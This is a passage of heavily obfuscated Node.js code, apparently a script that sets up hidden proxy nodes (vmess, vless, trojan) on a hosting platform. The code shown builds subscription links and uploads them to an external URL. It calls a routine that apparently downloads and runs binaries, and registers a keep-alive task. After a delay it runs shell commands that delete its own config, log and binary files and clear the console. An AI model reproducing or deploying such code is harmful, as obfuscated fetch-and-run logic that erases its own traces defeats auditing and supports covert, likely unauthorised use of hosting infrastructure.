_0x183525[_0x3793c9(0x23d)]['countryCode']+'_'+_0x183525[_0x3793c9(_0x319ada._0x68371f)]['org'];}catch(_0xb3c88a){}}return _0x3793c9(0x1ce);}async function _0x5126e8(_0x1ad5cc){const _0x29720f={_0xb62ad2:0x224,_0x1feca2:0x26e,_0x33844d:0x24a,_0x311d04:0x1f0,_0x16427d:0x263,_0x1b2abd:0x225,_0x12ba8b:0x215},_0x26d4b5=await _0x17a81c(),_0x2d3392=NAME?NAME+'-'+_0x26d4b5:_0x26d4b5;return new Promise(_0x399cf7=>{const _0x591220={_0x3a70f9:0x1d1,_0x55260c:0x244};setTimeout(()=>{const _0x47658e=_0x5b92,_0x21a730={'v':'2','ps':''+_0x2d3392,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x47658e(_0x29720f._0xb62ad2),'net':'ws','type':'none','host':_0x1ad5cc,'path':'/vmess-argo?ed=2560','tls':_0x47658e(0x23a),'sni':_0x1ad5cc,'alpn':'','fp':_0x47658e(0x20d)},_0x2d59d7=_0x47658e(0x211)+UUID+'@'+CFIP+':'+CFPORT+_0x47658e(_0x29720f._0x1feca2)+_0x1ad5cc+_0x47658e(0x263)+_0x1ad5cc+_0x47658e(0x218)+_0x2d3392+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x47658e(_0x29720f._0x33844d)](_0x21a730))[_0x47658e(0x215)](_0x47658e(0x1d1))+_0x47658e(_0x29720f._0x311d04)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x1ad5cc+_0x47658e(_0x29720f._0x16427d)+_0x1ad5cc+_0x47658e(0x1ff)+_0x2d3392+_0x47658e(0x21c);console[_0x47658e(0x22d)](Buffer[_0x47658e(_0x29720f._0x1b2abd)](_0x2d59d7)[_0x47658e(_0x29720f._0x12ba8b)]('base64')),fs['writeFileSync'](subPath,Buffer['from'](_0x2d59d7)[_0x47658e(_0x29720f._0x12ba8b)](_0x47658e(0x1d1))),console['log'](FILE_PATH+_0x47658e(0x1b9)),uploadNodes(),app[_0x47658e(0x26c)]('/'+SUB_PATH,(_0x1c758b,_0x5464af)=>{const _0x288d2d=_0x47658e,_0x270379=Buffer[_0x288d2d(0x225)](_0x2d59d7)[_0x288d2d(0x215)](_0x288d2d(_0x591220._0x3a70f9));_0x5464af[_0x288d2d(0x250)](_0x288d2d(0x1bf),_0x288d2d(_0x591220._0x55260c)),_0x5464af['send'](_0x270379);}),_0x399cf7(_0x2d59d7);},0x7d0);});}}async function uploadNodes(){const _0x13f18b={_0x1fafc0:0x21b,_0x55b95a:0x22d,_0x18a942:0x1c2,_0x1173f5:0x21e,_0x2c4f3c:0x1f1},_0x24f676=_0x2d24c7;if(UPLOAD_URL&&PROJECT_URL){const _0x4cfb93=PROJECT_URL+'/'+SUB_PATH,_0x21cd5c={'subscription':[_0x4cfb93]};try{const _0x11cab5=await axios[_0x24f676(0x208)](UPLOAD_URL+_0x24f676(0x270),_0x21cd5c,{'headers':{'Content-Type':_0x24f676(_0x13f18b._0x1fafc0)}});return _0x11cab5&&_0x11cab5['status']===0xc8?(console[_0x24f676(_0x13f18b._0x55b95a)]('Subscription\x20uploaded\x20successfully'),_0x11cab5):null;}catch(_0x39649d){if(_0x39649d[_0x24f676(0x233)]){if(_0x39649d[_0x24f676(0x233)][_0x24f676(_0x13f18b._0x18a942)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x24f676(0x27e)](listPath))return;const _0x18b466=fs['readFileSync'](listPath,_0x24f676(0x1f7)),_0x399108=_0x18b466[_0x24f676(_0x13f18b._0x1173f5)]('\x0a')[_0x24f676(0x200)](_0x297577=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x297577));if(_0x399108[_0x24f676(0x220)]===0x0)return;const _0x56f565=JSON[_0x24f676(0x24a)]({'nodes':_0x399108});try{const _0x37d7e3=await axios[_0x24f676(0x208)](UPLOAD_URL+_0x24f676(_0x13f18b._0x2c4f3c),_0x56f565,{'headers':{'Content-Type':_0x24f676(0x21b)}});return _0x37d7e3&&_0x37d7e3['status']===0xc8?(console[_0x24f676(0x22d)](_0x24f676(0x23c)),_0x37d7e3):null;}catch(_0x13af40){return null;}}else return;}}function cleanFiles(){const _0x5372c9={_0x861f91:0x1b6,_0x46cbf6:0x261,_0x3eaf36:0x1c1};setTimeout(()=>{const _0x4a3388={_0x18c33f:0x264,_0x12ae46:0x23b},_0x3f7e66={_0x37b378:0x243},_0x56fe78=_0x5b92,_0x1c59d6=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1c59d6[_0x56fe78(0x1ef)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1c59d6[_0x56fe78(0x1ef)](phpPath);process[_0x56fe78(_0x5372c9._0x861f91)]===_0x56fe78(_0x5372c9._0x46cbf6)?exec(_0x56fe78(_0x5372c9._0x3eaf36)+_0x1c59d6['join']('\x20')+_0x56fe78(0x1f5),_0xa6d1b6=>{const _0x3e3678=_0x56fe78;console[_0x3e3678(_0x3f7e66._0x37b378)](),console[_0x3e3678(0x22d)](_0x3e3678(0x264)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x56fe78(0x207)+_0x1c59d6['join']('\x20')+_0x56fe78(0x1cd),_0x4db901=>{const _0xfd1c57=_0x56fe78;console['clear'](),console[_0xfd1c57(0x22d)](_0xfd1c57(_0x4a3388._0x18c33f)),console[_0xfd1c57(0x22d)](_0xfd1c57(_0x4a3388._0x12ae46));});},0x15f90);}cleanFiles();function _0x5b92(_0x427c44,_0x2062ed){const _0x538e49=_0x538e();return _0x5b92=function(_0x5b92eb,_0x59abf7){_0x5b92eb=_0x5b92eb-0x1b6;let _0xda6162=_0x538e49[_0x5b92eb];return _0xda6162;},_0x5b92(_0x427c44,_0x2062ed);}async function AddVisitTask(){const _0x19cf2d={_0x4cc5ff:0x1f3,_0x24cf8f:0x274,_0x5479f8:0x21b,_0x4b9464:0x202,_0x3b8936:0x25e,_0x2189ed:0x27b},_0x396829=_0x2d24c7;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x396829(_0x19cf2d._0x4cc5ff));return;}try{const _0x592edc=await axios['post'](_0x396829(_0x19cf2d._0x24cf8f),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x396829(_0x19cf2d._0x5479f8)}});return console[_0x396829(0x22d)](_0x396829(_0x19cf2d._0x4b9464)),_0x592edc;}catch(_0x21ccd2){return console['error'](_0x396829(_0x19cf2d._0x3b8936)+_0x21ccd2[_0x396829(_0x19cf2d._0x2189ed)]),null;}}async function startserver(){const _0x2908a9={_0x11ad74:0x24d},_0x5608cb=_0x2d24c7;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x66acd4){console[_0x5608cb(_0x2908a9._0x11ad74)](_0x5608cb(0x249),_0x66acd4);}}startserver()[_0x2d24c7(0x262)](_0x502633=>{const _0x1184d5={_0x1ccb1b:0x1bc},_0x2558b4=_0x2d24c7;console[_0x2558b4(0x24d)](_0x2558b4(_0x1184d5._0x1ccb1b),_0x502633);}),app[_0x2d24c7(0x222)](PORT,()=>console[_0x2d24c7(0x22d)](_0x2d24c7(0x248)+PORT+'!'));
